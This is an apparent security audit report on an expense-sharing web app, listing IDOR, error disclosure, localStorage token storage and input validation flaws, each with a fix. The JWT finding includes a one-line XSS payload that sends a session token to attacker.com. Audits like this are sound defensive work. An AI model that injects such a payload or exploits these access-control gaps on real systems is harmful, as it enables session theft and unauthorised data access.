# SECURITY AUDIT REPORT: ExpensesControl

**Date:** 2026-04-19
**Scope:** `~/.openclaw/workspace-dev/expenses-control/`
**Auditor:** Security Audit Agent

---

## 1. Executive Summary

The security audit of the ExpensesControl application revealed several critical and high-severity vulnerabilities. The most significant risks involve **Broken Access Control (IDOR)** and **Information Disclosure**, which could allow an attacker to view or manipulate data belonging to other users. Additionally, the use of `localStorage` for JWT storage presents a significant XSS-based token theft risk.

### Summary of Findings
| Severity | Count |
| :--- | :--- |
| 🔴 **CRITICAL** | 2 |
| 🟠 **HIGH** | 2 |
| 🟡 **MEDIUM** | 1 |
| 🔵 **LOW** | 0 |

**Top 3 Critical Risks:**
1. **Broken Access Control (IDOR) in Group/Expense Routes:** Users can access any group or expense by simply guessing or iterating through IDs.
2. **Sensitive Information Disclosure in Error Responses:** The server returns raw database error messages (`err.message`) to the client, leaking schema details.
3. **Insecure Token Storage (XSS Risk):** Storing JWTs in `localStorage` makes them vulnerable to theft via Cross-Site Scripting (XSS).

---

## 2. Detailed Findings

### [CRITICAL] Broken Access Control (IDOR) - Group/Expense/Settlement Access
- **File:** `server/src/routes/groups.js:44`, `server/src/routes/expenses.js:64`, `server/src/routes/settlements.js:24`
- **Type:** Broken Access Control (IDOR)
- **Description:** The application uses the `auth` middleware to verify that a user is logged in, but it fails to verify that the authenticated user is actually a **member** of the group being accessed. An attacker can access any group's details, members, or expenses by changing the `groupId` in the API request.
- **Attack Scenario:** An attacker logs in with their own account, then sends a GET request to `/api/groups/123` (where 123 is a group they don't belong to). The server returns the full group details and member list.
- **Remediation:** In every route that accepts a `groupId`, add a check to ensure `req.user.id` is present in the `group_members` table for that specific `groupId`.

### [CRITICAL] Sensitive Information Disclosure via Error Messages
- **File:** `server/src/index.js:34`, `server/src/routes/auth.js:26`, `server/src/routes/expenses.js:46`
- **Type:** Information Exposure
- **Description:** The application catches errors and returns `err.message` directly in the JSON response. This can leak database schema names, table structures, or even sensitive logic details to an attacker.
- **Attack Scenario:** An attacker sends a malformed request (e.g., a string where a number is expected) to an endpoint. The server responds with `500 Internal Server Error: SQLITE_ERROR: no such column: [column_name]`, revealing the internal database structure.
- **Remediation:** Log the full error on the server for debugging, but return a generic error message to the client (e.g., `"An internal error occurred"`).

### [HIGH] Insecure JWT Storage (XSS Vulnerability)
- **File:** `client/src/api.js:7`
- **Type:** Insecure Storage / XSS
- **Description:** The application retrieves the JWT from `localStorage` to attach it to requests. `localStorage` is accessible by any JavaScript running on the page, meaning a single XSS vulnerability anywhere in the app allows an attacker to steal the user's session token.
- **Attack Scenario:** An attacker finds an XSS vulnerability in a component. They inject a script: `fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'))`. The user's session is now compromised.
- **Remediation:** Store the JWT in an `HttpOnly` and `Secure` cookie. This prevents client-side JavaScript from accessing the token.

### [HIGH] Broken Access Control (IDOR) - Member Management
- **File:** `server/src/routes/groups.js:77`
- **Type:** Broken Access Control (IDOR)
- **Description:** The `DELETE /:id/members/:userId` endpoint allows any authenticated user to remove any user from any group, provided they know the `groupId` and `userId`. There is no check to see if the requester is the group creator or an authorized admin.
- **Attack Scenario:** An attacker iterates through user IDs and group IDs to systematically remove all members from all groups in the system.
- **Remediation:** Implement an authorization check to ensure only the group creator or an authorized administrator can modify group membership.

### [MEDIUM] Lack of Input Validation (Mass Assignment/Type Confusion)
- **File:** `server/src/routes/expenses.js:10`
- **Type:** Improper Input Validation
- **Description:** While some fields are checked for existence, the `splits` array and `amount` are not strictly validated for type or structure. This could lead to unexpected behavior or logical errors in the debt calculation logic.
- **Attack Scenario:** An attacker sends a `percentage` split type but provides an empty or malformed `splits` array, potentially causing the server to crash or miscalculate balances.
- **Remediation:** Use a validation library like `Joi` or `Zod` to enforce strict schemas for all incoming request bodies.

---

## 3. Conclusion & Next Steps

The application currently has fundamental architectural flaws regarding **authorization**. Fixing the `auth` middleware to check for group membership is the highest priority. Once authorization is secured, the application should move away from `localStorage` for session management and implement generic error handling to prevent information leakage.
